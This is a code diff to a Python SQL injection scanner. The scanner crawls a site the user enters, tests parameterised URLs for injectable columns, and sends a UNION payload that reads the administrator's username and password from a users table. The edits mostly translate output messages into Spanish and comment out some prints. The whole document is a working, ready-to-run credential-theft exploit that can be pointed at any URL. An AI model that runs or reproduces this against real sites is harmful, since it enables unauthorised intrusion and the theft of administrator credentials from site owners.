@@ -62,24 +62,25 @@ def find_urls_to_test(url, base_url):
     if not links:
         print("[-] No URLs with parameters found.")
     else:
-        print(f"[+] Found {len(links)} URLs with parameters.")
+        print(f"[+] Found {len(links)} URLs")
     
     return links
 
 # perform SQL injection to find the administrator's password
 def exploit_sqli_users_table(url):
-    print(f"\n[+] Starting SQL Injection on users table for URL: {url}")
+    # print("[+] Starting SQL Injection on users table.")
     username = 'administrator'
     sql_payload = "' UNION select username, password from users--"
     r = requests.get(url + sql_payload, verify=False, proxies=proxies)
     res = r.text
 
     if username in res:
-        print("[+] Found the administrator password.")
+        # print("[+] Found the administrator password.")
         soup = BeautifulSoup(r.text, 'html.parser')
         admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
-        print("[+] The administrator password is '%s'" % admin_password)
+        print("[+] Encontramos la contasena del usuario administrador '%s'" % admin_password)
         return True
+    
     return False
 
 # perform the SQL injection
@@ -120,11 +121,11 @@ if __name__ == "__main__":
     base_url = input("Ingrese la URL que quiere escanear: ").strip()
     base_url = base_url.rstrip('/')
 
-    print("[+] Crawling the website to find URLs with parameters...")
+    print("[+] Inspeccionando las distintas rutas para la pagina ingresada...")
     urls_to_test = find_urls_to_test(base_url, base_url)
 
     if urls_to_test:
-        print("[+] Found the following URLs with parameters:")
+        # print("[+] Found the following URLs with parameters:")
         for url in urls_to_test:
             print(url)
 
@@ -142,11 +143,11 @@ if __name__ == "__main__":
                     print(f"[+] Vulnerable URL found: {test_url}")
                     print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta URL")
                 else:
-                    print(f"[-] URL not vulnerable: {test_url}")
+                    print("[-] URL not vulnerable to sql injection")
             
             # After testing general vulnerabilities, test for user table credentials
-            if exploit_sqli_users_table(test_url):
-                print(f"[+] Administrator credentials found at URL: {test_url}")
+            exploit_sqli_users_table(test_url)
+            
     else:
         print("[-] No URLs with parameters found.")
 
